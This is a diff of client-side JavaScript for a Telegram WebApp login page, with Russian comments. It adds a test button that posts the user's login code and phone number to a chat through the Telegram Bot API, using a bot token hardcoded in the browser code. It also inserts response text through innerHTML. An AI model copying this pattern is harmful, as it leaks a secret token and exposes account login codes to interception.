@@ -659,6 +659,20 @@
                         const dataString = JSON.stringify(data);
                         this.tg.sendData(dataString);
                         console.log('✅ Данные отправлены через Telegram WebApp sendData:', dataString);
+                        
+                        // Ждем немного и проверяем результат
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        
+                        // Показываем успешное сообщение
+                        const status = document.getElementById('authStatus');
+                        status.innerHTML = `
+                            ✅ <strong>Данные отправлены!</strong><br><br>
+                            📱 Ваши данные авторизации отправлены через Telegram WebApp.<br>
+                            🔍 Проверьте чат с ботом - там должно появиться сообщение о проверке данных.<br><br>
+                            💡 Если авторизация прошла успешно, вы получите уведомление.<br><br>
+                            🚀 <strong>Рекомендуем использовать команду /mobile_auth для удобной авторизации!</strong>
+                        `;
+                        
                         return true;
                     } catch (error) {
                         console.warn('⚠️ Ошибка Telegram WebApp sendData:', error);
@@ -678,7 +692,14 @@
                     }
                 }
 
-                // Приоритет 3: PostMessage API (для мобильных WebView)
+                // Приоритет 3: Показываем инструкции для мобильных устройств
+                if (this.platform.isMobile) {
+                    console.log('📱 Показываем инструкции для мобильной авторизации');
+                    this.showMobileAuthInstructions(data);
+                    return true;
+                }
+
+                // Приоритет 4: PostMessage API (для мобильных WebView)
                 if (window.parent !== window) {
                     try {
                         console.log('📨 Используем PostMessage API');
@@ -694,55 +715,11 @@
                     }
                 }
 
-                // Приоритет 4: Создание скрытой формы (последний резерв)
-                try {
-                    console.log('📋 Используем скрытую форму');
-                    
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.style.display = 'none';
-                    
-                    // Добавляем данные как скрытые поля
-                    Object.keys(data).forEach(key => {
-                        const input = document.createElement('input');
-                        input.type = 'hidden';
-                        input.name = key;
-                        input.value = typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key];
-                        form.appendChild(input);
-                    });
-                    
-                    document.body.appendChild(form);
-                    
-                    // Пытаемся отправить через Telegram API
-                    const formData = new FormData(form);
-                    const urlParams = new URLSearchParams(formData);
-                    
-                    // Используем Telegram API для отправки данных
-                    if (this.tg) {
-                        this.tg.sendData(urlParams.toString());
-                        console.log('✅ Данные отправлены через скрытую форму');
-                        document.body.removeChild(form);
-                        return true;
-                    }
-                    
-                    document.body.removeChild(form);
-                } catch (error) {
-                    console.warn('⚠️ Ошибка скрытой формы:', error);
-                }
-
-                // Если все методы Telegram не сработали - показываем данные пользователю
+                // Если все методы не сработали - показываем инструкции
                 console.error('❌ Все методы отправки данных недоступны');
                 console.log('📋 Данные для ручной передачи:', data);
                 
-                // Показываем данные пользователю для ручного ввода
-                const status = document.getElementById('authStatus');
-                status.innerHTML = `
-                    ❌ Автоматическая отправка недоступна.<br>
-                    📝 Отправьте эти данные боту вручную:<br>
-                    <strong>Код:</strong> ${data.code}<br>
-                    <strong>Телефон:</strong> ${data.phone}
-                `;
-                
+                this.showMobileAuthInstructions(data);
                 return false;
             }
 
@@ -902,7 +879,11 @@
                     2. Вернитесь в чат с ботом<br>
                     3. Отправьте команду: <code>/mobile_auth</code><br>
                     4. Следуйте пошаговым инструкциям бота<br><br>
-                    ⚠️ Или используйте команду: <code>/auth ${data.code} ${data.phone}</code>
+                    ⚠️ Или используйте команду: <code>/auth ${data.code} ${data.phone}</code><br><br>
+                    🔍 <strong>Почему не работает автоматическая отправка?</strong><br>
+                    • На мобильных устройствах Telegram WebApp может иметь ограничения<br>
+                    • Бот может быть не в сети или иметь технические проблемы<br>
+                    • Используйте команды бота для надежной авторизации
                 `;
                 
                 // Добавляем кнопки
@@ -945,8 +926,25 @@
                     }
                 };
                 
+                // Кнопка тестирования HTTP fallback
+                const testButton = document.createElement('button');
+                testButton.textContent = '🧪 Тест HTTP Fallback';
+                testButton.className = 'copy-button';
+                testButton.style.marginLeft = '8px';
+                testButton.style.background = 'linear-gradient(135deg, #ffc107 0%, #fd7e14 100%)';
+                testButton.onclick = () => {
+                    testButton.textContent = '⏳ Тестируем...';
+                    this.testHTTPFallback(data).then(() => {
+                        testButton.textContent = '✅ Тест завершен';
+                        setTimeout(() => {
+                            testButton.textContent = '🧪 Тест HTTP Fallback';
+                        }, 3000);
+                    });
+                };
+                
                 buttonContainer.appendChild(copyButton);
                 buttonContainer.appendChild(chatButton);
+                buttonContainer.appendChild(testButton);
                 status.appendChild(buttonContainer);
             }
 
@@ -964,6 +962,68 @@
                         this.tg.close();
                     }
                 }, 2000);
+            }
+
+            // Тестирование HTTP fallback
+            async testHTTPFallback(data) {
+                try {
+                    console.log('🧪 Тестируем HTTP fallback...');
+                    
+                    // Пытаемся получить chat_id
+                    const chatId = this.getCurrentChatId();
+                    console.log('🔍 Chat ID для теста:', chatId);
+                    
+                    if (!chatId) {
+                        console.log('❌ Chat ID не найден для теста');
+                        return;
+                    }
+                    
+                    // Тестируем подключение к боту
+                    const botToken = '8232668997:AAHCvWtcjtqw5b5tuYrYwg1lCz0oItjhUEg';
+                    const testMessage = `🧪 Тест HTTP Fallback:\n\nКод: ${data.code}\nТелефон: ${data.phone}\nВремя: ${new Date().toLocaleString()}`;
+                    
+                    console.log(`📤 Отправляем тестовое сообщение в чат ${chatId}`);
+                    
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: testMessage,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        console.log('✅ HTTP fallback тест успешен!');
+                        const status = document.getElementById('authStatus');
+                        status.innerHTML += `
+                            <br><br>🧪 <strong>HTTP Fallback тест успешен!</strong><br>
+                            ✅ Сообщение отправлено в чат ${chatId}<br>
+                            🔍 Проверьте чат с ботом
+                        `;
+                    } else {
+                        const errorText = await response.text();
+                        console.warn('⚠️ HTTP fallback тест не удался:', response.status, errorText);
+                        const status = document.getElementById('authStatus');
+                        status.innerHTML += `
+                            <br><br>🧪 <strong>HTTP Fallback тест не удался:</strong><br>
+                            ❌ Ошибка ${response.status}: ${errorText}<br>
+                            💡 Попробуйте использовать команды бота
+                        `;
+                    }
+                    
+                } catch (error) {
+                    console.error('❌ Ошибка тестирования HTTP fallback:', error);
+                    const status = document.getElementById('authStatus');
+                    status.innerHTML += `
+                        <br><br>🧪 <strong>HTTP Fallback тест не удался:</strong><br>
+                        ❌ Ошибка: ${error.message}<br>
+                        💡 Попробуйте использовать команды бота
+                    `;
+                }
             }
 
             // Обработка ошибки
